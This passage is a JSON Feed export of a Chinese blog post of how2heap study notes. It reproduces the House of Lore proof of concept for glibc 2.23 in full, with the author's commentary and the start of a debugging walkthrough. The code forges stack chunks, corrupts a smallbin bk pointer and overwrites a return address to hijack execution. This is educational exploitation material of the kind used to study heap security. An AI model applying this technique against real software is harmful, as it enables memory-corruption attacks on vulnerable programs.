{
    "version": "https://jsonfeed.org/version/1",
    "title": "此时相望不相闻，愿逐月华流照君 • All posts by \"pwn专栏\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap(2)/",
            "url": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap(2)/",
            "title": "how2heap",
            "date_published": "2023-10-19T11:23:15.000Z",
            "content_html": "<p>本来想着一篇文章写完 glibc2.23how2heap 系列，但是太长了，还是分开写吧</p>\n<h1 id=\"6house_of_gods还没搞明白先挖个坑\"><a class=\"anchor\" href=\"#6house_of_gods还没搞明白先挖个坑\">#</a> 6. <code>house_of_gods</code> 【还没搞明白，先挖个坑】</h1>\n<h1 id=\"7house_of_lore\"><a class=\"anchor\" href=\"#7house_of_lore\">#</a> 7. <code>house_of_lore</code></h1>\n<p>这个漏洞就是利用了申请 samll bin 后会将 bk 指到下个 chunk 上，如果这个 chunk 是我们想要控制的那么我们就可以申请回来然后利用，在要控制处伪造 chunk，使他的 fd 指向 small bin 的 chunk 即可绕过检测（一开始在想既然能直接该想要修改处的值，还伪造干嘛；后面发现这里能改写但是无法 getshell，伪造后能利用其返回的 ret 来 getshell）</p>\n<h2 id=\"1程序源码\"><a class=\"anchor\" href=\"#1程序源码\">#</a> 1. 程序源码</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Advanced exploitation of the House of Lore - Malloc Maleficarum.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>This PoC take care also of the glibc hardening of smallbin corruption.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>[...]</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>// 这一部分在 glibc 源代码的 3414 行，是在申请 smallbin 时执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    &#123;</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      bck = victim->bk;//bck 为要申请出去的 chunk 的 bk 指向的 chunk</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    if (__glibc_unlikely (bck->fd != victim))&#123;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     // 检测 smallbin 的双链表</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                  errstr = \"malloc (): smallbin double linked list corrupted\";</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                  goto errout;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                &#125;</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       set_inuse_bit_at_offset (victim, nb);// 设置 smallbin 的 inuse 位，nb 为申请的大小（包括头部）</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>       bin->bk = bck;//bin 就是 victim 的 fd 指向的 chunk</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>       bck->fd = bin;// 这里就是从双链表摘除 victim 进行的操作</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>       [ ... ]</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">jackpot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Nice jump d00d\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Lore\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating the victim chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the first small chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token comment\">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim_chunk <span class=\"token operator\">=</span> victim<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_1 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_2 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Create a fake chunk on the stack\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\"</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>         <span class=\"token string\">\"in second to the last malloc, which putting stack address on smallbin list\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> victim_chunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \"</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>         <span class=\"token string\">\"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \"</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>         <span class=\"token string\">\"chunk on stack\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating another large chunk in order to avoid consolidating the top chunk with\"</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>         <span class=\"token string\">\"the small one during the free()\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p5 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the large chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> p5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This means that the chunk %p will be inserted in front of the SmallBin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p2 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\"</span><span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>  <span class=\"token comment\">//------------VULNERABILITY-----------</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>  victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// victim->bk is pointing to stack</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>  <span class=\"token comment\">//------------------------------------</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now allocating a chunk with size equal to the first one freed\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p4 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 为什么还需要申请一个 P4，申请完 p3 不就直接可以直接到了想要的地方吗：p4 就是想要的栈块，但是 buffer2 在干什么；buffer2 是让我们看其 fd 指针被修改了</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"p4 = malloc(0x100)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>         stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\np4 is %p and should be on the stack!\\n\"</span><span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// this chunk will be allocated on stack</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> sc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Emulating our in-memory shellcode</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  <span class=\"token keyword\">long</span> offset <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_frame_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>p4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>p4<span class=\"token operator\">+</span>offset<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sc<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// This bypasses stack-smash detection since it jumps over the canary  。。。对这里的 + 8 不太明白，猜测是越过 rbp 到返回地址，程序最后执行了 jackpot 函数也证实了这个想法</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token comment\">// sanity check</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>  <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_return_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个例子是对 smallbin 的 bk 指针进行修改，指到栈上 (buffer1)，也修改了 buffer1 和 buffer 的 fd 和 bk 指针，修改 fd 指针就是为了绕过申请 smallbin 时的检测，最后就是假设了一个 shellcode 然后复制到 canary 后面的区域执行</p>\n<p><code>long offset = (long)__builtin_frame_address(0) - (long)p4;</code>  代码里有这么一行，然后查了查发现 <code>__builtin_frame_address(LEVEL)</code>  是一个内建函数</p>\n<p>这个函数是用来查看函数的栈帧地址 [ <code>__builtin_frame_address</code>  可用于确定是否已到达堆栈顶部]</p>\n<pre><code>0：查看当前函数的栈帧地址\n1：查看当前函数调用者的栈帧地址\n</code></pre>\n<p>【关于内建函数：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhhaXh1ZS5jYy9jLWFybS9jLWFybS1idWlsdGluLmh0bWw=\">https://www.zhaixue.cc/c-arm/c-arm-builtin.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydW5lYm9vay5kZXYvemgvZG9jcy9nY2MvcmV0dXJuLWFkZHJlc3MlRTMlODAlOTE=\">https://runebook.dev/zh/docs/gcc/return-address】</span></p>\n<h2 id=\"2调试程序\"><a class=\"anchor\" href=\"#2调试程序\">#</a> 2. 调试程序</h2>\n<h3 id=\"1执行到50行\"><a class=\"anchor\" href=\"#1执行到50行\">#</a> 1. 执行到 50 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 创建栈</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Lore\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token 